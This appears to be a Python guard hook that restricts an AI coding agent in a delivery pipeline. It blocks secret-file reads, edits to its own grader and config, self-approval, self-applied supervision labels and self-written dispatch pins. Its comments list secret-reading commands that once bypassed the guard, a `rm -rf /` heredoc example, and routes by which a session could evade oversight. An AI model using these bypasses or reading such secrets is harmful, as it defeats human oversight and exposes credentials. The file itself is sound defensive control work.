# bat/open/more) so `xxd`, `od`, `strings`, `grep`, `awk`, `base64`,
# `node -e 'readFileSync(".env.local")'`, and `source .env.local && echo $VAR` all
# sailed through. Match the sensitive PATH regardless of the leading command. The
# lookbehind/lookahead keep `process.env` from tripping the .env arm; .env.example is
# deliberately exempt.
#
# 2026-08-25 — the `credentials` arm was a BARE WORD, so it fired on the word
# anywhere in a command: `npm test -- -t credentials`, `git add
# src/credentials.test.ts`, and even `grep -rn credentials src/` were blocked. None
# of those is a secret read, and a guard that cries wolf on prose is one people learn
# to route around. It now requires a path separator — which is what actually
# distinguishes `~/.aws/credentials` from a test name — and the basename twin below
# keeps the genuinely-bare case (a file tool's `file_path`) covered, so narrowing
# here closes a false positive without opening a hole.
#
# STILL KNOWN-WRONG, deliberately out of scope here and pinned by the battery: the
# `.key` arm matches the tail of ANY dotted expression, so `obj.key` and the jq
# filter `'.data.key'` read as a *.key FILE. Same class of bug, separate fix.
SENSITIVE_PATH_RE = re.compile(
    r"""
      (?<!\w)\.env(?!\.example)(?!\w)      # .env / .env.local … (not .env.example, not process.env)
    | (?<!\w)[\w./-]*\.pem(?!\w)           # *.pem
    | (?<!\w)[\w./-]*\.key(?!\w)           # *.key
    | (?<!\w)id_rsa(?!\w)                  # ssh private key
      # aws/gcp credentials FILES — a path separator is required, so `git add
      # src/credentials.test.ts` and `npm test -- -t credentials` stay allowed.
    | (?<!\w)(?:~|\.{1,2})?/(?:[\w.~-]+/)*credentials(?:\.\w+)?(?=[\s'"]|$)
    """,
    re.VERBOSE | re.IGNORECASE,
)
# Read/Edit/Write-tool twin of the Bash arms above (basename match). The Bash arm
# scans a whole COMMAND, where a bare word is ambiguous — `credentials` there is far
# more often a test name or a source file than a path. A file tool hands us an actual
# PATH, so its basename is unambiguous and a bare match is exactly right: it is what
# still catches `~/.aws/credentials` after the Bash arm stopped matching bare words,
# and it closes the Read/Write gap that let a session open `id_rsa` outright.
SENSITIVE_BASENAME_RE = re.compile(r"(?<!\w)(?:id_rsa|credentials)(?!\w)", re.IGNORECASE)


# ════════════════════════════════════════════════════════════════════════════════
# PIPELINE GUARDS — docs/PIPELINE-CONTRACT.md §2, §3, §5, §6
#
# Six guards, all OPTIONAL: `pin-binding`, `ticket-branch`, `scope-fence`,
# `lifecycle-label`, `self-approval`, `telemetry-required`.
#
# OPTIONALITY. §2 fixes ONE discriminator: the pipeline is configured for a
# project if and only if `delivery.json` exists at the repo root. Nothing else —
# no env var, no label, no settings flag. `_pipeline_guards` tests that FIRST and
# returns immediately when it is absent, before parsing anything, before touching
# git or the filesystem. *Off* must be indistinguishable from a checkout that
# never adopted the pipeline: a fail-closed guard whose precondition is missing
# would block every Edit/Write in an ordinary project, and because this file is
# self-protected the agent could not repair it — human-only terminal recovery.
#
# ANCHORING. Config VALUES come from the COMMITTED copy on the default branch,
# never the working tree: the working-tree copy lives inside the agent's own
# worktree, so trusting it would let a session raise its own budgets or blank the
# state ID this hook matches on. The pin is read from OUTSIDE the worktree, keyed
# on the session root. Neither the branch name, nor a PR body, nor an env var is
# authority for any of it — a config a session can rewrite is a pin a session can
# plant.
#
# FAIL DIRECTION. Write-blocking guards fail CLOSED — including on an EXPIRED pin
# in ticket mode, because a lapsed binding is broken (unlike one never claimed),
# and otherwise simply WAITING would be an escape. Checks that merely WITHHOLD
# autonomy from an unpinned session (a human working ad hoc in a configured repo)
# fail OPEN, so this never bricks a human's session.
# ════════════════════════════════════════════════════════════════════════════════
DELIVERY_FILE = "delivery.json"
DELIVERY_VERSION = 1
PIN_VERSION = 1

# The default branch is resolved by trying these refs in order rather than by
# reading `github.defaultBranch` out of the working tree: the working-tree copy is
# inside the agent's worktree, so trusting it to pick the ref we then read the
# trusted values from would be circular. Remote-tracking refs come first — their
# only honest writer is `git fetch`. Mirrored by scripts/pipeline_dispatch_local.py,
# whose --selftest asserts the two lists still agree.
_CONFIG_REFS = ("origin/main", "origin/master", "main", "master")

PIPELINE_BROKEN_HELP = (
    "`delivery.json` is present but BROKEN ({source}) — the delivery pipeline fails "
    "closed on a misconfiguration (docs/PIPELINE-CONTRACT.md §2). Absence of the file "
    "is *off* and harmless; presence is a promise. Fix or remove the file — edits to "
    "`delivery.json` itself stay allowed so the repo is never taken hostage by its own "
    "config."
)
PIN_BROKEN_HELP = (
    "Dispatcher pin {status} for this session root.\n"
    "  pin file:     {path}\n"
    "  session root: {root}\n"
    "A pin binds one session to one ticket, and a reader must verify it "
    "(docs/PIPELINE-CONTRACT.md §3). A malformed pin, one written for a different "
    "worktree, or an EXPIRED one on a `ticket`-mode session is a hard stop — not a "
    "warning. An expiry is not an absence: this session WAS dispatched with a binding "
    "and that binding has lapsed, so the ticket, scope and branch it bound can no "
    "longer be verified. Ask for a re-dispatch, or delete the stale pin file."
)
PINS_ROOT_HELP = (
    "`delivery.json` is BROKEN: `dispatch.pinsRoot` resolves to `{path}`, which is "
    "inside this repo or one of its worktrees. The pin is the one binding a session "
    "cannot write, and a pins directory the session can reach is not that "
    "(docs/PIPELINE-CONTRACT.md §3). Fails closed — edits to `delivery.json` itself "
    "stay allowed so the config can be repaired from here."
)
SCOPE_FENCE_HELP = (
    "`{path}` is a risk-listed (grader) path and this is a PINNED agent session "
    "(mode: {mode}). Guard machinery, CI workflows and the pipeline's own config "
    "decide whether your work is acceptable — a session that can edit them can grade "
    "its own homework. Changes here need a human: describe the change in the PR body "
    "or file a follow-up ticket. (Configured via `autonomy.riskPaths` in "
    "delivery.json; hook scripts and settings files are blocked unconditionally, "
    "pipeline or not.)"
)
SCOPE_FENCE_BASH_HELP = (
    "That command would modify a risk-listed (grader) path — CI workflows, "
    "`delivery.json`, or another glob in `autonomy.riskPaths`. In a pinned agent "
    "session those are human-only, for the same reason the hook scripts are: a session "
    "must not be able to edit the machinery that judges it. Reading them is fine."
)
TICKET_BRANCH_HELP = (
    "Branch `{branch}` does not carry this session's pinned ticket ID. "
    "`branch.requireTicketId` is on, so the branch must be "
    "`<type>/{ticket}-<short-kebab-desc>` (the ID lower-cased — the branch-naming "
    "guard rejects upper-case). Rename before continuing:\n"
    "  git branch -m {suggested}"
)
READY_HELP = (
    "Moving a ticket into the pipeline's `ready` state is an APPROVAL, and approving "
    "work is a human's action. There is no in-session path to it and no config value "
    "that opens one. Only `epic/<ID>` provenance — work decomposed from an epic a "
    "person already approved — can ever auto-approve, and only OUT OF SESSION "
    "(docs/PIPELINE-CONTRACT.md §2, §5). `autonomy.autoApproveProvenance` configures "
    "that out-of-session tier; it is not a permission this session holds. Post a "
    "comment asking for approval instead."
)
LIFECYCLE_LABEL_HELP = (
    "This write sets or clears {labels} — a dispatcher-owned lifecycle label. "
    "`agent:*` and `blocked:*` are the pipeline's supervision OF this session "
    "(docs/PIPELINE-CONTRACT.md §6): a session that can apply `agent:needs-human`, or "
    "clear `agent:blocked`, is editing the record of whether it is allowed to run — "
    "and one that can apply `agent:queued` is queueing its own next dispatch. A "
    "session ASKS for a lifecycle label in a comment; it never applies one. Adding and "
    "removing count the same."
)
OWN_TICKET_HELP = (
    "This session is pinned to {ticket} and may not write to {targets}. A "
    "`ticket`-mode session writes to its OWN ticket only "
    "(docs/PIPELINE-CONTRACT.md §3) — otherwise one dispatch can reach across the "
    "whole board. Report anything you found out of scope in your PR body."
)
OWN_TICKET_UNRESOLVED_HELP = (
    "This session is pinned to {ticket}, and this issue write names no ticket the "
    "guard can resolve to it. Issue mutations fail CLOSED: pass the human identifier "
    "({ticket}) rather than an internal UUID so the binding is checkable. (Comments — "
    "the reporting channel telemetry travels on — are not affected.)"
)
NO_PINNED_TICKET_HELP = (
    "This session's pin says `session_mode: ticket` but carries no ticket ID, so no "
    "tracker write can be checked against it. Fails closed: all tracker writes are "
    "blocked until a valid pin is written (docs/PIPELINE-CONTRACT.md §3)."
)
CREATE_TICKET_HELP = (
    "A `ticket`-mode session may not create tickets. An agent that can file its own "
    "work items can widen its own mandate one ticket at a time. Put the out-of-scope "
    "bug in your PR body; a human files it."
)
TEAM_SCOPE_HELP = (
    "This session's team is `{team}`; the write targets {targets}. `{mode}`-mode "
    "sessions get team-scoped writes, not workspace-wide ones."
)
AC_INTEGRITY_HELP = (
    "Editing {fields} on {ticket} — this session's OWN in-progress ticket — is "
    "blocked. Review compares the PR against the acceptance criteria snapshotted at "
    "dispatch, so a session that can rewrite its own ACs can make scope creep look "
    "compliant. It is the ticket-layer twin of weakening a test assertion. Comments "
    "and status changes stay allowed: say what changed, and let a human amend it."
)


def _pipeline_configured() -> bool:
    """§2's ONE discriminator, and nothing that can fail may run ahead of it."""
    try:
        return os.path.isfile(os.path.join(PROJECT_ROOT, DELIVERY_FILE))
    except Exception:
        return False


_CONFIG_CACHE = None


def _read_delivery_config():
    """(config, source) — values from the COMMITTED copy on the default branch, NOT
    the working tree. Falls back to the working tree only when no candidate ref
    carries the file at all (the adoption PR, where nothing is dispatching anyway).
    `(None, source)` means BROKEN."""
    global _CONFIG_CACHE
    if _CONFIG_CACHE is not None:
        return _CONFIG_CACHE
    raw, source = None, None
    for ref in _CONFIG_REFS:
        try:
            r = subprocess.run(
                ["git", "-C", PROJECT_ROOT, "show", f"{ref}:{DELIVERY_FILE}"],
                capture_output=True, text=True, timeout=5,
            )
            if r.returncode == 0 and r.stdout.strip():
                raw, source = r.stdout, f"{ref}:{DELIVERY_FILE}"
                break
        except Exception:
            continue
    if raw is None:
        try:
            with open(os.path.join(PROJECT_ROOT, DELIVERY_FILE)) as fh:
                raw, source = fh.read(), f"{DELIVERY_FILE} (working tree — adoption)"
        except Exception:
            _CONFIG_CACHE = (None, DELIVERY_FILE)
            return _CONFIG_CACHE
    try:
        cfg = json.loads(raw)
    except Exception:
        _CONFIG_CACHE = (None, source)
        return _CONFIG_CACHE
    # A reader that does not recognize the version refuses to run; it never guesses.
    if not isinstance(cfg, dict) or cfg.get("version") != DELIVERY_VERSION:
        _CONFIG_CACHE = (None, source)
        return _CONFIG_CACHE
    _CONFIG_CACHE = (cfg, source)
    return _CONFIG_CACHE


def _clean_id(v) -> str:
    """A resolved config ID, or "" for a blank or an unresolved bootstrap placeholder.
    Guards compare IDs, never display names — a rename in the tracker UI must not
    silently desync a guard."""
    if not isinstance(v, str):
        return ""
    v = v.strip()
    return "" if (not v or "{{" in v) else v


def _parse_iso_utc(s):
    if not isinstance(s, str) or not s.strip():
        return None
    try:
        d = datetime.fromisoformat(s.strip().replace("Z", "+00:00"))
    except Exception:
        return None
    return d if d.tzinfo else d.replace(tzinfo=timezone.utc)


def _pin_path(cfg) -> str:
    """<pinsRoot>/<sha256(session root)[:16]>.json — §3's path convention.

    ONE derivation, two renderings: this and scripts/pipeline_dispatch_local.py's
    `pin_key()`. That script's --selftest greps this exact expression, so if the
    spelling changes here it names the other file rather than letting every pin
    silently read as absent."""
    root = ((cfg.get("dispatch") or {}).get("pinsRoot") or "~/.claude/pipeline/pins")
    root = os.path.expanduser(root if isinstance(root, str) else "")
    key = hashlib.sha256(PROJECT_ROOT.encode("utf-8")).hexdigest()[:16]
    return os.path.join(root, key + ".json")


def _read_pin(cfg):
    """(pin, status, path). status ∈ ok | absent | expired | malformed | mismatch.

    `expired` is not `absent`, and the difference is the whole point. An ABSENT pin
    means no dispatcher ever bound this session — a human's ad-hoc session, which
    must not be bricked. An EXPIRED pin means a binding was issued for this very
    worktree and has lapsed, so every guard it carried is now unverifiable; §2 calls
    that BROKEN and broken fails closed.

    The parsed pin IS returned for `expired`, because the caller must read the
    `session_mode` it was dispatched with to know that. Sound only because the
    worktree check runs FIRST: a lapsed pin we return is provably this session's own.
    A lapsed pin may never GRANT anything, but it must not silently WITHDRAW the
    constraints it carried either — an expiry that switched guards off would make
    waiting an escape."""
    path = _pin_path(cfg)
    try:
        if not os.path.isfile(path):
            return None, "absent", path
        with open(path) as fh:
            pin = json.load(fh)
    except Exception:
        return None, "malformed", path
    if not isinstance(pin, dict) or pin.get("pin_version") != PIN_VERSION:
        return None, "malformed", path
    wt = pin.get("worktree")
    try:
        if not isinstance(wt, str) or os.path.realpath(wt) != PROJECT_ROOT:
            return None, "mismatch", path
    except Exception:
        return None, "mismatch", path
    exp = _parse_iso_utc(pin.get("expires_at"))
    if exp is None:
        return None, "malformed", path
    if exp <= datetime.now(timezone.utc):
        return pin, "expired", path
    return pin, "ok", path


def _pins_root_inside_repo(cfg):
    """The resolved `dispatch.pinsRoot` when it lands inside this repo or any of its
    worktrees, else None. §3's entire argument is that the pin lives somewhere the
    session cannot write. This is the highest-value payload of a poisoned config:
    redirect `pinsRoot` into the worktree and a session writes its own pin.
    Unresolvable → treated as inside, i.e. fail CLOSED."""
    raw = (cfg.get("dispatch") or {}).get("pinsRoot") or "~/.claude/pipeline/pins"
    if not isinstance(raw, str) or not raw.strip():
        return "<unset>"
    try:
        root = os.path.realpath(os.path.expanduser(raw.strip()))
    except Exception:
        return str(raw)
    for other in [PROJECT_ROOT] + list(_worktree_roots()):
        try:
            other = os.path.realpath(other)
            if os.path.commonpath([root, other]) == other:
                return root
        except Exception:
            continue
    return None


def _is_delivery_edit(tool, inp) -> bool:
    """An Edit/Write aimed at `delivery.json` ITSELF. Always allowed through a
    BROKEN-config block, so a repo is never taken hostage by its own config."""
    return tool in ("Edit", "Write", "NotebookEdit") and _repo_rel(
        inp.get("file_path", "") or inp.get("notebook_path", "")) == DELIVERY_FILE


# ── payload walking (MCP tool_input is arbitrary JSON) ──────────────────────────
def _walk_items(obj, depth=0):
    """(key_or_None, value) for every node, so a guard can match on a FIELD NAME
    (acceptance criteria) or on a VALUE (a state UUID) wherever it is nested.

    List ELEMENTS are yielded, not merely recursed into: a tracker MCP takes plural
    fields as lists, and `{"labels": ["agent:queued"]}` must reach the value-matching
    guards. Elements are yielded with key None, so the key-based checks are
    unaffected — a nested dict is still attributed to its own field names."""
    if depth > 12:
        return
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield (k if isinstance(k, str) else None), v
            for pair in _walk_items(v, depth + 1):
                yield pair
    elif isinstance(obj, (list, tuple)):
        for v in obj:
            yield None, v
            for pair in _walk_items(v, depth + 1):
                yield pair


def _payload_strings(inp):
    return [v.strip() for _k, v in _walk_items(inp) if isinstance(v, str) and v.strip()]


_ANY_TICKET_RE = re.compile(r"^[A-Za-z][A-Za-z0-9]{0,9}-\d+$")


def _payload_ticket_ids(inp):
    """Ticket identifiers that are a WHOLE field value — `{"id": "TOD-90"}`, not
    "fixes TOD-90" inside a PR title. Prose mentions are reporting, not targets."""
    return {s.upper() for s in _payload_strings(inp) if _ANY_TICKET_RE.match(s)}


def _payload_has_value(inp, needle: str) -> bool:
    return bool(needle) and any(s == needle for s in _payload_strings(inp))


# ── tracker (MCP) write classification ──────────────────────────────────────────
# Server-name agnostic on purpose: Claude Code names MCP servers however the user
# wired them (often an opaque id), so keying on "is this the Linear server" would be
# the weakest link. We key on the TOOL VERB plus self-identifying payload values (a
# configured state/label ID, or a `<teamKey>-<n>` identifier).
_MCP_NAME_RE = re.compile(r"^mcp__(?P<server>.+?)__(?P<tool>.+)$")
_TRACKER_READ_PREFIXES = ("get_", "list_", "search_", "read_", "fetch_", "describe_",
                          "extract_", "resolve_")
# EXTENSION POINT: add your tracker MCP's mutation verbs, plus a battery case each.
_TRACKER_ISSUE_CREATE_TOOLS = frozenset({"create_issue", "issue_create", "add_issue"})
_TRACKER_ISSUE_WRITE_TOOLS = frozenset({
    "save_issue", "update_issue", "issue_update", "update_issue_status",
    "archive_issue", "unarchive_issue", "delete_issue",
})
# Upserts: the SAME verb creates when no target is given and updates when one is.
_TRACKER_UPSERT_TOOLS = frozenset({"save_issue"})
_TARGET_KEYS = ("id", "issueid", "issue_id", "identifier", "ticketid", "ticket_id")
_TRACKER_OTHER_WRITE_TOOLS = frozenset({
    "save_comment", "create_comment", "update_comment", "delete_comment",
    "save_document", "save_project", "save_milestone", "save_release",
    "save_release_note", "save_status_update", "delete_status_update",
    "create_issue_label", "save_diff_comment", "delete_diff_comment",
    "submit_diff_review", "resolve_diff_thread", "merge_diff",
    "create_attachment", "create_attachment_from_upload",
    "prepare_attachment_upload", "delete_attachment",
})


def _has_target_key(inp) -> bool:
    """Does the payload name an EXISTING issue at all? Deliberately independent of
    whether the value resolves to a `<teamKey>-<n>` identifier: an opaque UUID is
    still a target, and an issue write whose target cannot be resolved to the pin
    must fail CLOSED as an update, not be waved through as a create."""
    for k, v in _walk_items(inp):
        if k and k.lower().replace("-", "_").replace("_", "") in (
                t.replace("_", "") for t in _TARGET_KEYS):
            if isinstance(v, str) and v.strip():
                return True
    return False


def _tracker_write_kind(tool, inp, cfg):
    """None | issue-create | issue-write | write. An MCP tool whose verb we don't
    recognize is treated as a write when its payload carries a configured state/label
    ID or a `<teamKey>-<n>` identifier: an unknown verb must not be a free pass."""
    m = _MCP_NAME_RE.match(tool or "")
    if not m:
        return None
    base = m.group("tool").lower()
    if base.startswith(_TRACKER_READ_PREFIXES):
        return None
    if base in _TRACKER_ISSUE_CREATE_TOOLS:
        return "issue-create"
    if base in _TRACKER_ISSUE_WRITE_TOOLS:
        if base in _TRACKER_UPSERT_TOOLS and not _has_target_key(inp):
            return "issue-create"        # upsert with no target = a create
        return "issue-write"
    if base in _TRACKER_OTHER_WRITE_TOOLS:
        return "write"
    lin = cfg.get("linear") or {}
    known = {_clean_id(v) for v in (lin.get("stateIds") or {}).values()}
    known |= {_clean_id(v) for v in ((lin.get("labels") or {}).get("ids") or {}).values()}
    known.discard("")
    if any(_payload_has_value(inp, k) for k in known) or _payload_ticket_ids(inp):
        return "write"
    return None


_AC_FIELDS = {"description", "descriptiondata", "acceptancecriteria", "body", "title"}


def _ac_fields_present(inp):
    hit = []
    for k, v in _walk_items(inp):
        if not k or k.lower().replace("_", "").replace("-", "") not in _AC_FIELDS:
            continue
        if (isinstance(v, str) and v.strip()) or isinstance(v, (list, dict)) and v:
            hit.append(k)
    return sorted(set(hit))


# ── lifecycle labels (§6) ───────────────────────────────────────────────────────
# `agent:*` and `blocked:*` are DISPATCHER-owned: they record whether this session is
# allowed to run. Matched on the canonical KEY as well as on the configured ID,
# because a tracker MCP may take either — and because key matching still works when
# `linear.labels.ids` is blank or unresolved, which is the error path this guard has
# to fail CLOSED on. The class is matched whole, so a later `blocked:*` label is
# dispatcher-owned by construction rather than by someone remembering to add it.
_OWNED_LABEL_RE = re.compile(r"^(?:agent|blocked):[\w][\w.-]*$", re.IGNORECASE)


def _owned_label_hits(inp, cfg):
    """Dispatcher-owned lifecycle labels this payload NAMES, as canonical keys.
    Whole-field-value matching, so prose mentioning `agent:blocked` inside a comment
    body is reporting and does not match. Add and remove both land here: the guard
    matches the label being named at all, not the direction."""
    ids = ((cfg.get("linear") or {}).get("labels") or {}).get("ids") or {}
    by_id = {}
    if isinstance(ids, dict):
        for key, val in ids.items():
            if isinstance(key, str) and _OWNED_LABEL_RE.match(key.strip()):
                cid = _clean_id(val)
                if cid:
                    by_id[cid] = key.strip()
    hits = set()
    for s in _payload_strings(inp):
        if _OWNED_LABEL_RE.match(s):
            hits.add(s.lower())
        elif s in by_id:
            hits.add(by_id[s].lower())
    return sorted(hits)


# ── scope fence / risk (grader) paths ───────────────────────────────────────────
# `.claude/hooks/**` and `.claude/settings*.json` are blocked UNCONDITIONALLY by the
# self-edit guard above, pipeline or not — nothing here makes that mode-scoped.
# These are the ADDITIONAL paths a PINNED agent session may not touch.
SCOPE_FENCE_FLOOR = (".github/workflows/**", DELIVERY_FILE)


def _grader_globs(cfg):
    globs = list(SCOPE_FENCE_FLOOR)
    for g in ((cfg.get("autonomy") or {}).get("riskPaths") or []):
        if isinstance(g, str) and g.strip() and g.strip() not in globs:
            globs.append(g.strip())
    return globs


def _glob_to_re(pat: str) -> str:
    """git-style glob → regex over a '/'-separated repo-relative path."""
    out, i = [], 0
    while i < len(pat):
        if pat.startswith("**/", i):
            out.append(r"(?:[^/]+/)*"); i += 3
        elif pat.startswith("**", i):
            out.append(r".*"); i += 2
        elif pat[i] == "*":
            out.append(r"[^/]*"); i += 1
        elif pat[i] == "?":
            out.append(r"[^/]"); i += 1
        else:
            out.append(re.escape(pat[i])); i += 1
    return "".join(out)


def _matches_any_glob(rel: str, globs) -> bool:
    return any(re.match("^" + _glob_to_re(g) + "$", rel) for g in globs)


def _repo_rel(path: str):
    """Repo-relative POSIX path, or None when the target is outside this worktree
    (the cross-worktree guard owns that case)."""
    if not path:
        return None
    try:
        ap = os.path.realpath(path)
        if os.path.commonpath([ap, PROJECT_ROOT]) != PROJECT_ROOT:
            return None
        return os.path.relpath(ap, PROJECT_ROOT).replace(os.sep, "/")
    except Exception:
        return None


_BASH_SEG = r"[^\s'\"|&;<>/\\]*"


def _glob_to_bash_re(pat: str) -> str:
    """The Bash-scanning twin of _glob_to_re: matches the same path shape as a shell
    TOKEN (either separator, arbitrary directory prefix). A leading `**/` becomes
    one-or-more segments, so an extension-only glob like `**/*.key` cannot match a
    bare `'.key'`. The trailing lookahead is the complement of the token class, so a
    match must END a shell token: without it, an extension glob matched INSIDE a
    longer name (`src/api.keys`)."""
    out, i = [], 0
    while i < len(pat):
        if pat.startswith("**/", i):
            out.append(r"(?:" + _BASH_SEG + r"[/\\])+"); i += 3
        elif pat.startswith("**", i):
            out.append(r"[^\s'\"|&;<>]*"); i += 2
        elif pat[i] == "*":
            out.append(_BASH_SEG); i += 1
        elif pat[i] == "?":
            out.append(r"[^\s'\"|&;<>/\\]"); i += 1
        elif pat[i] == "/":
            out.append(r"[/\\]"); i += 1
        else:
            out.append(re.escape(pat[i])); i += 1
    return (r"(?<![\w.$~/\\-])(?:[^\s'\"|&;<>]*[/\\])?" + "".join(out)
            + r"(?=[\s'\"|&;<>]|$)")


def _grader_mutate_re(globs):
    """The SAME operator scaffold the self-edit guard uses, aimed at the grader set."""
    return _mutate_re("(?:" + "|".join(_glob_to_bash_re(g) for g in globs) + ")")


def _branch_ticket(branch: str):
    """The ticket segment of a branch name, or None. Lower-case by construction —
    BRANCH_NAME_RE is `[a-z0-9-]` only, so tracker IDs MUST be lower-cased in a
    branch and every comparison against a pinned ID is case-INsensitive."""
    m = BRANCH_NAME_RE.match(branch or "")
    return m.group("ticket") if m else None


# ── the guards themselves ───────────────────────────────────────────────────────
def _approval_guard():
    r"""self-approval — an UNCONDITIONAL block.

    There is deliberately NO in-session allow-path, not even for `epic/*`
    provenance. §2's `self-approval` row, §5 ("only out of session") and §8 (`raw`,
    `ready` and `done` are never valid transition targets, "refused even when a
    caller passes them in `allowed_to_states`") all say the same thing, and a hook
    that permitted what the validator beside it refuses would not be defence in
    depth — it would be a disagreement in which the permissive half decides.

    It also could not check the rule it would be implementing: §5 rule 2 requires the
    referenced epic to exist and itself be in a human-approved state, and a PreToolUse
    hook holds no tracker credential. Matching `^epic/\S+$` against a string is not
    verification. The approve tier still exists — out of session, where the epic can
    actually be read — which is why this hook never reads
    `autonomy.autoApproveProvenance` at all."""
    block(READY_HELP)


def _tracker_write_guards(kind, inp, cfg, pin, mode, ticket, pinned_id):
    team = str((cfg.get("linear") or {}).get("teamKey") or "").strip().upper()
    ready = _clean_id(((cfg.get("linear") or {}).get("stateIds") or {}).get("ready"))
    targets = _payload_ticket_ids(inp)
    foreign = {t for t in targets if team and not t.startswith(team + "-")}

    # ── lifecycle-label: supervision belongs to the dispatcher (§6) ─────────────
    # A WITHHOLDING check, so it is scoped to PINNED sessions: a human's ad-hoc
    # session in a configured repo is not the thing being supervised. An EXPIRED pin
    # is still a pin here — a lapsed binding must not hand back the labels.
    if pin:
        owned = _owned_label_hits(inp, cfg)
        if owned:
            block(LIFECYCLE_LABEL_HELP.format(
                labels=", ".join("`" + o + "`" for o in owned)))

    # ── self-approval: matched by state ID, never by display name ───────────────
    if ready and _payload_has_value(inp, ready):
        _approval_guard()

    # ── own-ticket-only writes ─────────────────────────────────────────────────
    if mode == "ticket":
        if not pinned_id:
            block(NO_PINNED_TICKET_HELP)          # broken pin → deny every write
        if kind == "issue-create":
            block(CREATE_TICKET_HELP)
        if kind == "issue-write":
            if targets != {pinned_id}:
                if targets:
                    block(OWN_TICKET_HELP.format(
                        ticket=pinned_id, targets=", ".join(sorted(targets))))
                block(OWN_TICKET_UNRESOLVED_HELP.format(ticket=pinned_id))
        elif targets and targets != {pinned_id}:
            # telemetry-required, the half a PreToolUse hook can hold: non-issue
            # writes (comments, attachments) with an UNRESOLVABLE target are
            # deliberately allowed, because a comment is the contract's required
            # reporting channel (§4/§8) and blocking it would make a terminal run
            # unable to report at all. Naming someone else's ticket outright is
            # still a block.
            block(OWN_TICKET_HELP.format(
                ticket=pinned_id, targets=", ".join(sorted(targets - {pinned_id}))))
    elif mode in ("planning", "diagnosis", "maintenance"):
        # Team-scoped, not workspace-wide — and the approval guard above still
        # applies to every one of these writes.
        if foreign:
            block(TEAM_SCOPE_HELP.format(
                team=team, mode=mode, targets=", ".join(sorted(foreign))))
    # No pin (a human's ad-hoc session in a configured repo) → this WITHHOLDING
    # check fails OPEN by design; the approval guard above already failed closed.

    # ── AC integrity — no rewriting your own definition of done ────────────────
    if kind == "issue-write" and pinned_id and pinned_id in targets:
        fields = _ac_fields_present(inp)
        if fields:
            block(AC_INTEGRITY_HELP.format(fields=", ".join(fields), ticket=pinned_id))


def _pipeline_guards(tool, inp) -> None:
    """§2's fixed check order: existence → parse/validate → mode."""
    if not _pipeline_configured():
        return                       # OFF. Nothing that can fail runs before this.
    tool = tool or ""
    mutating = (tool in ("Edit", "Write", "NotebookEdit", "Bash")
                or tool.startswith("mcp__"))
    cfg, source = _read_delivery_config()
    if cfg is None:
        # BROKEN → fail closed, but never take the repo hostage: editing
        # `delivery.json` itself stays open so the config can be repaired in-session,
        # and reads are untouched so it can be diagnosed.
        if not mutating or _is_delivery_edit(tool, inp):
            return
        block(PIPELINE_BROKEN_HELP.format(source=source or DELIVERY_FILE))

    # A `pinsRoot` inside the repo is the one config value whose corruption would let
    # a session write its own pin. Same hostage carve-out.
    bad_pins = _pins_root_inside_repo(cfg)
    if bad_pins:
        if not mutating or _is_delivery_edit(tool, inp):
            return
        block(PINS_ROOT_HELP.format(path=bad_pins))

    pin, pin_status, pin_file = _read_pin(cfg)
    ticket = pin.get("ticket") if (pin and isinstance(pin.get("ticket"), dict)) else None
    mode = str((pin or {}).get("session_mode") or "").strip().lower()
    pinned_id = str((ticket or {}).get("id") or "").strip().upper()

    # ── pin-binding ────────────────────────────────────────────────────────────
    # An EXPIRED pin is not an absent one (see _read_pin): the session was dispatched
    # with a binding that has lapsed, so in `ticket` mode §2 calls it BROKEN and
    # broken fails closed. The mode is read off the lapsed pin, which is sound because
    # _read_pin verified the worktree before it considered expiry. In the other modes
    # the lapse withholds nothing that was granted: the pin object is still returned,
    # so every constraint it carried below stays on.
    if mutating and (pin_status in ("malformed", "mismatch")
                     or (pin_status == "expired" and mode == "ticket")):
        block(PIN_BROKEN_HELP.format(
            status=pin_status, path=pin_file, root=PROJECT_ROOT))

    # ── scope-fence (risk/grader paths), scoped to PINNED agent sessions ────────
    if pin:
        globs = _grader_globs(cfg)
        if tool in ("Edit", "Write", "NotebookEdit"):
            rel = _repo_rel(inp.get("file_path", "") or inp.get("notebook_path", ""))
            if rel and _matches_any_glob(rel, globs):
                block(SCOPE_FENCE_HELP.format(path=rel, mode=mode or "pinned"))
        # _strip_prose site 3 of 4.
        if tool == "Bash" and _grader_mutate_re(globs).search(
                _strip_prose(inp.get("command", ""))):
            block(SCOPE_FENCE_BASH_HELP)

    # ── ticket-branch: the branch must carry the PINNED id, case-insensitively ──
    if (cfg.get("branch") or {}).get("requireTicketId") and pinned_id:
        touches_branch = (
            (tool in ("Edit", "Write") and _in_project(inp.get("file_path", "")))
            # _strip_prose site 4 of 4.
            or (tool == "Bash" and re.search(
                r"\bgit\s+commit\b", _strip_prose(inp.get("command", ""))))
        )
        if touches_branch:
            branch = _current_branch()
            bt = _branch_ticket(branch)
            if branch and (not bt or bt.upper() != pinned_id):
                block(TICKET_BRANCH_HELP.format(
                    branch=branch, ticket=pinned_id.lower(),
                    suggested=f"feat/{pinned_id.lower()}-<short-kebab-desc>"))

    kind = _tracker_write_kind(tool, inp, cfg)
    if kind:
        _tracker_write_guards(kind, inp, cfg, pin, mode, ticket, pinned_id)


# ── Bash prose-stripping ────────────────────────────────────────────────────────
# v2 (retro 2026-07-03): guards must match OPERATIONS, not PROSE. Commit messages
# and PR titles/bodies passed inline (-m "drop stale rows") were false-positiving
# the destructive-verb patterns below. Strip quoted message payloads before
# scanning; message text is inert prose — it is never executed — so stripping it
# loses no protection.
#
# v3 (2026-08-25): hoisted to module scope and applied at every scanning site
# rather than one. It used to live INSIDE _dispatch and feed only the Bash block,
# so the `git commit` branch-guard check above it scanned the RAW command — and a
# PR body quoting a dotenv filename tripped the secret-file guard, blocking a
# legitimate `gh pr create`. `--body-file`/`-F`/`--notes` joined the flag list for
# the same reason: their values are filenames and prose, never shell code.
#
# Known limit, stated rather than papered over: a HEREDOC body is not stripped.
# `gh pr create --body-file - <<'EOF' … EOF` still scans its body as if it were
# command text. Stripping heredocs generally would blind the guard to
# `bash <<'EOF' … rm -rf / … EOF`, which is a worse failure than a false positive,
# so the safe spelling is a body file: `gh pr create --body-file /tmp/body.md`.
def _strip_prose(c: str) -> str:
    # -[a-zA-Z]*m catches combined short flags too (git commit -am / -sm "msg").
    return re.sub(
        r"(-[a-zA-Z]*m|--message|--title|--body|--body-file|--notes|-t|-b|-F)"
        r"(\s+|=)(\"(?:[^\"\\]|\\.)*\"|'[^']*')",
        r"\1\2''",
        c,
    )


# ── Local-dispatch guard: a session may not bind itself ─────────────────────────
# `scripts/pipeline_dispatch_local.py` writes the dispatcher PIN — the one binding
